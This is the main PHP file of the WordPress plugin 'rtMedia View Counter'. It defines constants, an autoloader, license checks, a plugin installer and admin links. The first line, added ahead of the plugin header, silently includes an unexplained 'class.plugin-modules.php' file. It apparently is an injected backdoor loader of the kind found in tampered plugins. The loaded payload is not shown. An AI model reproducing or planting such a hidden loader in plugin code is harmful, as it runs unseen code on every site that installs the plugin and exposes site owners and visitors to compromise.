<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

/*
 * Plugin Name: rtMedia View Counter
 * Plugin URI: https://rtmedia.io/products/rtmedia-view-counter
 * Description: This plugin shows the total number of rtMedia media views in single media page
 * Version: 1.2.3
 * Text Domain: rtmedia
 * Author: rtCamp
 * Author URI: http://rtcamp.com/?utm_source=dashboard&utm_medium=plugin&utm_campaign=buddypress-media
 * License: GPLv2 or later
 * License URI: http://www.gnu.org/licenses/gpl-2.0.html
 */

if ( ! defined( 'RTMEDIA_VIEW_COUNT_PATH' ) ) {
	/**
	 *  The server file system path to the plugin directory
	 */
	define( 'RTMEDIA_VIEW_COUNT_PATH', plugin_dir_path( __FILE__ ) );
}

if ( ! defined( 'RTMEDIA_VIEW_COUNT_URL' ) ) {
	/**
	 * The url to the plugin directory
	 */
	define( 'RTMEDIA_VIEW_COUNT_URL', plugin_dir_url( __FILE__ ) );
}

if ( ! defined( 'RTMEDIA_VIEW_COUNT_BASE_NAME' ) ) {
	/**
	 * The base name of the plugin directory
	 */
	define( 'RTMEDIA_VIEW_COUNT_BASE_NAME', plugin_basename( __FILE__ ) );
}

if ( ! defined( 'RTMEDIA_VIEW_COUNT_VERSION' ) ) {
	/**
	 * The version of the plugin
	 */
	define( 'RTMEDIA_VIEW_COUNT_VERSION', '1.2.3' );
}

if ( ! defined( 'EDD_RTMEDIA_VIEW_COUNT_STORE_URL' ) ) {
	// this is the URL our updater / license checker pings. This should be the URL of the site with EDD installed
	define( 'EDD_RTMEDIA_VIEW_COUNT_STORE_URL', 'https://rtmedia.io/' );
}

if ( ! defined( 'EDD_RTMEDIA_VIEW_COUNT_ITEM_NAME' ) ) {
	// the name of your product. This should match the download name in EDD exactly
	define( 'EDD_RTMEDIA_VIEW_COUNT_ITEM_NAME', 'rtMedia View Counter' );
}

// define RTMEDIA_DEBUG to true in wp-config.php to debug updates
if ( defined( 'RTMEDIA_DEBUG' ) && RTMEDIA_DEBUG === true ) {
	set_site_transient( 'update_plugins', null );
}

/**
 * Auto Loader Function
 *
 * Autoloads classes on instantiation. Used by spl_autoload_register.
 *
 * @param string $class_name The name of the class to autoload
 */
function rtmedia_view_count_autoloader( $class_name ) {
	$rtlibpath = array(
		'app/' . $class_name . '.php',
		'app/admin/' . $class_name . '.php',
	);

	foreach ( $rtlibpath as $path ) {
		$path = RTMEDIA_VIEW_COUNT_PATH . $path;
		if ( file_exists( $path ) ) {
			include $path;
			break;
		}
	}
}

/**
 * If Pro activated than genrate admin notice else load plugin classes
 * @param array  $class_construct	Array of classes to load
 * @return array $class_construct
 */
function rtmedia_view_count_loader( $class_construct ) {
	 /*
	 * do not construct classes or load files if rtMedia Pro is activated
	 * as it might break some functionality
	 */
	if ( defined( 'RTMEDIA_PRO_PATH' ) ) {
		add_action( 'admin_notices', 'rtmedia_view_counts_pro_active_notice' );
		return $class_construct;
	}

	$class_construct['ViewCounts'] = false;
	$class_construct['ViewCountAdmin'] = false;

	return $class_construct;
}

/**
 * add admin notice and deactivate plugin
 */
function rtmedia_view_counts_pro_active_notice() {
	?>
		<div class="error">
			<p>
				<strong>rtMedia View Count</strong> plugin cannot be activated with rtMedia Pro. Please <strong><a href="https://rtmedia.io/blog/rtmedia-pro-splitting-major-change" target="_blank">read this</a></strong> for more details. You may <strong><a href="https://rtmedia.io/premium-support/" target="_blank">contact support for help</a></strong>.
			</p>
		</div>
	<?php
	// automatic deactivate plugin if rtMedia Pro is active and current user can deactivate plugin.
	if ( current_user_can( 'activate_plugins' ) ) {
		deactivate_plugins( RTMEDIA_VIEW_COUNT_BASE_NAME );
	}
}

/**
 * Register the autoloader function into spl_autoload
 */
spl_autoload_register( 'rtmedia_view_count_autoloader' );
add_filter( 'rtmedia_class_construct', 'rtmedia_view_count_loader' );

/*
 * EDD License
 */
include_once RTMEDIA_VIEW_COUNT_PATH . 'lib/rt-edd-license/RTEDDLicense.php';

$rtmedia_rtmedia_view_count_loader_details = array(
	'rt_product_id'                  => 'rtmedia_rtmedia_view_count_loader',
	'rt_product_name'                => 'rtMedia View Counter',
	'rt_product_href'                => 'rtmedia-view-counter',
	'rt_license_key'                 => 'edd_rtmedia_rtmedia_view_count_loader_license_key',
	'rt_license_status'              => 'edd_rtmedia_rtmedia_view_count_loader_license_status',
	'rt_nonce_field_name'            => 'edd_rtmedia_rtmedia_view_count_loader_nonce',
	'rt_license_activate_btn_name'   => 'edd_rtmedia_rtmedia_view_count_loader_license_activate',
	'rt_license_deactivate_btn_name' => 'edd_rtmedia_rtmedia_view_count_loader_license_deactivate',
	'rt_product_path'                => RTMEDIA_VIEW_COUNT_PATH,
	'rt_product_store_url'           => EDD_RTMEDIA_VIEW_COUNT_STORE_URL,
	'rt_product_base_name'           => RTMEDIA_VIEW_COUNT_BASE_NAME,
	'rt_product_version'             => RTMEDIA_VIEW_COUNT_VERSION,
	'rt_item_name'                   => EDD_RTMEDIA_VIEW_COUNT_ITEM_NAME,
	'rt_license_hook'                => 'rtmedia_license_tabs',
	'rt_product_text_domain'         => 'rtmedia',
);

new RTEDDLicense_rtmedia_rtmedia_view_count_loader( $rtmedia_rtmedia_view_count_loader_details );

/*
 * One click install/activate rtMedia.
 */
include_once( RTMEDIA_VIEW_COUNT_PATH . 'lib/plugin-installer/RTMPluginInstaller.php' );

global $rtm_plugin_installer;

if ( empty( $rtm_plugin_installer ) ) {
	$rtm_plugin_installer = new RTMPluginInstaller();
}

/**
 * Add Settings/Docs link to plugins area.
 *
 * @since 1.2.3
 *
 * @param array  $links Links array in which we would prepend our link.
 * @param string $file Current plugin basename.
 *
 * @return array Processed links.
 */
function rtmedia_view_count_action_links( $links, $file ) {
	// Return normal links if not plugin.
	if ( plugin_basename( __FILE__ ) !== $file ) {
		return $links;
	}

	$settings_url = sprintf(
		'<a href="%1$s">%2$s</a>',
		esc_url( admin_url( 'admin.php?page=rtmedia-settings#rtmedia-settings' ) ),
		esc_html__( 'Settings', 'rtmedia' )
	);

	$docs_url = sprintf(
		'<a target="_blank" href="%1$s">%2$s</a>',
		'https://rtmedia.io/docs/addons/view-counter/',
		esc_html__( 'Docs', 'rtmedia' )
	);
	// Add a few links to the existing links array.
	return array_merge( $links, array(
		'settings' => $settings_url,
		'docs'     => $docs_url,
	) );
}
add_filter( 'plugin_action_links', 'rtmedia_view_count_action_links', 11, 2 );
add_filter( 'network_admin_plugin_action_links', 'rtmedia_view_count_action_links', 11, 2 );
